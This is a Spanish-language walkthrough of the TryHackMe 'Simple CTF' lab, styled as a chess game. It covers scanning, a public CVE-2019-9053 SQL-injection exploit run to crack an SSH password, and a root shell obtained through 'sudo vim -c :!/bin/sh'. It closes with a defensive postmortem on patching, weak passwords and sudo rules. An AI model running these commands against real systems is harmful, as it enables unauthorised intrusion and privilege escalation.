```
♟ PARTIDA 005
  SIMPLE CTF
  TryHackMe · Easy · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> cms made simple.
> sql injection a ciegas.
> vim como vector de escalada.
> el nombre de la sala no miente.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> simple ctf.
> el nombre es honesto.
> eso es lo más interesante que tiene.
```

> Simple CTF. Sin pretensiones. Sin tema narrativo. Sin nombre irónico. Solo una máquina que hace lo que dice: es simple. Lo que la hace interesante no es la dificultad. Es que concentra tres vectores clásicos en una sola partida: inyección SQL, credenciales débiles, y abuso de binario con privilegios elevados. Es un resumen del estado de la seguridad en sistemas mal mantenidos.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -p- --min-rate 5000 <IP>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache 2.4.18
2222/tcp open  ssh     OpenSSH 7.2
```

> Tres puertos. FTP en 21, web en 80, SSH reubicado en 2222.
>
> El SSH en puerto no estándar es un intento de reducir ruido: mueve el servicio fuera del alcance de los scanners superficiales. No cambia la superficie de ataque real. Solo la desplaza.

```bash
$ ftp <IP>
> anonymous login allowed
> directorio vacío.
```

> FTP anónimo activo. Sin contenido útil. La pieza estaba expuesta pero vacía: señal de que alguien habilitó el servicio sin terminar de configurarlo.

```bash
$ gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt

/simple/    (Status: 200)
```

```bash
$ curl http://<IP>/simple/ | grep -i "version"

> CMS Made Simple version 2.2.8
```

> CMS Made Simple 2.2.8. La versión importa.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ searchsploit cms made simple 2.2.8

CMS Made Simple 2.2.8 - SQL Injection   | CVE-2019-9053
```

> CVE-2019-9053. Inyección SQL de tipo time-based blind en el módulo de búsqueda de noticias. El exploit extrae credenciales carácter por carácter midiendo tiempos de respuesta. Lento. Metódico. Efectivo.
>
> La hipótesis es directa: extraer credenciales, usar SSH en 2222.

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ python3 exploit.py -u http://<IP>/simple/ --crack -w /usr/share/wordlists/rockyou.txt

[+] Username: mitch
[+] Password: secret
```

> `secret`.
>
> La contraseña es `secret`. No hace falta análisis adicional sobre esa decisión.

```bash
$ ssh mitch@<IP> -p 2222
> mitch@machine:~$

$ cat user.txt
> THM{[REDACTED]}
```

> Dentro. Bandera de usuario capturada.

---

## `> ♛ REY EXPUESTO: escalada`

```bash
$ sudo -l

> (root) NOPASSWD: /usr/bin/vim
```

> Vim con sudo sin contraseña.
>
> Vim no es solo un editor de texto. Es un entorno de ejecución. Tiene comandos internos que invocan shell. Eso lo convierte en un vector de escalada documentado, conocido, listado en GTFOBins. Alguien le dio acceso sudo a Vim pensando que era inofensivo.

```bash
$ sudo vim -c ':!/bin/sh'

> # whoami
  root
```

> Un comando. Una línea. Shell como root.

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: cms made simple 2.2.8 · CVE-2019-9053 sin parche
MOVIMIENTO 2: contraseña "secret" en sistema accesible desde internet
MOVIMIENTO 3: vim con privilegios sudo sin restricción de comandos internos
```

> Tres vectores. Tres capas de la misma historia: un sistema que nunca fue tratado como superficie de ataque.
>
> El CVE tenía exploit público desde 2019. La contraseña era `secret`: no como metáfora, literalmente la palabra secret. Y vim como binario sudo es un error que GTFOBins documenta con ejemplos listos para copiar. Ninguno de los tres requirió creatividad. Solo requirió que el sistema siguiera siendo lo que era.
>
> Simple CTF. El nombre sigue siendo lo más honesto de la sala.

```bash
$ echo $LESSON
> un binario con sudo no es solo un programa con permisos elevados.
> es una superficie de ataque con firma de root.
> vim, less, python, find: todos tienen escape a shell.
> gtfobins.github.io existe por una razón.
```

---

> *partida 005 · simple ctf · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  la contraseña era "secret".
  vim tenía sudo.
  el sistema describió su propia derrota
  antes de que llegara nadie.
-->
